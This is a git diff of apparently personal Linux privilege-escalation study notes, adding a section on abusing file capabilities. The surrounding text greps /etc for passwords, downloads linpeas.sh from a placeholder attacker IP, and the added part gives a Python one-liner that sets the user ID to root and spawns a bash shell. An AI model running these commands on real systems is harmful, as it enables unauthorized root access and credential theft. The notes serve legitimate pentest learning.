@@ -329,6 +329,7 @@ grep -r "pass" /etc 2>/dev/null
 ---
 
 ## Capabilities
+
 ```bash
 getcap -r / 2>/dev/null
 ```
@@ -341,7 +342,7 @@ binaries with elevated capabilities
 
 # EnumTools
 
-# linpeas
+## linpeas
 
 ```bash
 wget http://<IP>/linpeas.sh
@@ -360,6 +361,21 @@ chmod +x linpeas.sh
 - Wrong PATH usage
 - Misinterpreting SUID results
 
+👉 Check: 
+### Capabilities
+
+If Python
+
+![](../../assets/images/Pasted%20image%2020260520055618.png)
+
+![](../../assets/images/Pasted%20image%2020260520055728.png)
+
+```zsh
+```bash
+/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash");'
+```
+
+```
 ## linux-smart-enumeration
 
 ### github
